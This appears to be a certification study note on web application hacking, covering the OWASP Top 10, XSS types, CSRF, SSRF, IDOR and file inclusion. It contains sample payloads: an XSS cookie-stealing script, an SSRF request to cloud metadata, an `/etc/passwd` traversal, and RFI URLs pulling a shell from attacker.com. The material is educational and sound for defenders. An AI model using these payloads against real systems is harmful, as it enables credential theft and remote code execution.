# 01. Overview and Concepts — Hacking Web Applications

> [!INFO] 📌 **Module Scope & Core Objectives**
> Direct technical extraction from official CEH v13 Syllabus (Module 14). Covers OWASP Top 10 Security Risks, Cross-Site Scripting (Reflected, Stored, DOM-based), Cross-Site Request Forgery (CSRF), Insecure Direct Object References (IDOR), Local & Remote File Inclusion (LFI/RFI), Server-Side Request Forgery (SSRF), JWT Token Exploitation, and Web API Security (REST/SOAP/GraphQL).

---

## 🧠 1. Web Application Architecture & OWASP Framework

### 1.1 OWASP Top 10 Security Risks
The Open Web Application Security Project (OWASP) defines the critical vulnerability classifications affecting modern web applications.

1. **A01: Broken Access Control**: Unauthorized elevation of privilege or access to restricted user data (e.g., IDOR, path traversal).
2. **A02: Cryptographic Failures**: Transmitting plaintext data or using weak encryption algorithms (MD5/SHA1, missing TLS).
3. **A03: Injection**: Untrusted input executed as commands (SQLi, Command Injection, LDAP Injection, XSS).
4. **A04: Insecure Design**: Flaws in application architecture and business logic.
5. **A05: Security Misconfiguration**: Unhardened cloud buckets, default passwords, verbose error messages.
6. **A06: Vulnerable & Outdated Components**: Unpatched libraries and frameworks (e.g., Log4j CVE-2021-44228).
7. **A07: Identification & Authentication Failures**: Weak password policies, missing MFA, session fixation.
8. **A08: Software & Data Integrity Failures**: Insecure deserialization and unverified CI/CD updates.
9. **A09: Security Logging & Monitoring Failures**: Inadequate logging allowing persistent malicious activity.
10. **A10: Server-Side Request Forgery (SSRF)**: Web application fetches remote resources without validating user-supplied URLs, exposing internal network services (e.g., AWS metadata `169.254.169.254`).

> [!ABSTRACT] 🏛️ **📋 Comprehensive Web Application Vulnerability Matrix**

| Vulnerability Type | Primary Root Cause | Technical Exploitation Mechanism | Primary Impact |
| :--- | :--- | :--- | :--- |
| **Reflected XSS** | Unsanitized input echoed in response | `<script>alert(document.cookie)</script>` | Session Cookie Theft |
| **Stored XSS** | Unsanitized input stored in database | Malicious JS executed for all visitors | Mass Session Hijacking |
| **DOM-based XSS** | Insecure client-side DOM processing | `eval()` execution of `location.hash` | Client-side Code Execution |
| **CSRF** | Missing anti-forgery tokens | Cross-domain auto-submitting POST form | Unauthorized state change |
| **SSRF** | Unvalidated URL parameter fetching | `http://169.254.169.254/latest/meta-data/` | Cloud API Credential Theft |
| **IDOR** | Direct object lookup without auth check | Changing `user_id=100` to `user_id=101` | Unauthorized Data Leak |

---

## ⚡ 2. XSS Taxonomies & File Inclusion Mechanics

### 2.1 Cross-Site Scripting (XSS) Classification
- **Reflected XSS**: Non-persistent attack payload embedded in an HTTP request parameter and reflected in the server's immediate HTTP response.
- **Stored (Persistent) XSS**: Attack payload stored in backend persistent storage (database, comment section, message board) and executed whenever users view the affected page.
- **DOM-based XSS**: Entirely client-side vulnerability where client-side JavaScript reads data from a **Source** (e.g., `document.location`) and writes it into an insecure **Sink** (e.g., `document.write()` or `innerHTML`) without sanitization.

### 2.2 File Inclusion Vulnerabilities (LFI vs RFI)
- **Local File Inclusion (LFI)**: Includes local files on the web server (`/etc/passwd` or `C:\boot.ini`). Can lead to RCE via PHP Wrappers (`php://filter`, `php://input`) or log poisoning.
- **Remote File Inclusion (RFI)**: Requires `allow_url_include = On` in PHP. Includes and executes remote scripts hosted on an attacker's web server (`http://attacker.com/shell.txt`).

> [!IMPORTANT] 🔄 **📋 Comprehensive File Inclusion Mechanism Comparison Matrix**

| Feature Attribute | Local File Inclusion (LFI) | Remote File Inclusion (RFI) |
| :--- | :--- | :--- |
| **Target File Origin** | Server's local filesystem | Remote HTTP/FTP server |
| **PHP `php.ini` Requirement**| Standard configuration (`allow_url_fopen`) | Requires `allow_url_include = On` |
| **Exploitation Payload** | `../../../../etc/passwd` or PHP wrappers | `http://attacker.com/malicious_shell.txt` |
| **Primary Risk Outcome** | Local File Disclosure / Log Poison RCE | Immediate Remote Code Execution (RCE) |
